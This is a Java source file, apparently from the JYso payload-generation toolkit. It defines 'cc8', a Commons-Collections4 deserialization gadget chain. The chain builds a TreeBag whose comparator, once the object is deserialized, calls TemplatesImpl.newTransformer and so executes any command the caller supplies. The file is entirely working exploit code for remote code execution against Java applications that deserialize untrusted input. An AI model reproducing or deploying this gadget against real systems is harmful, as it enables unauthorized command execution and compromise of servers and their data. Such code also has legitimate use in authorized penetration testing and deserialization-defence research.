package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;


@SuppressWarnings({"rawtypes", "unchecked","unused"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({"navalorenzo"})
public class cc8 implements ObjectPayload<TreeBag> {

    public TreeBag getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        TransformingComparator comp = new TransformingComparator(transformer);
        TreeBag tree = new TreeBag(comp);
        tree.add(templates);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return tree;
    }
}
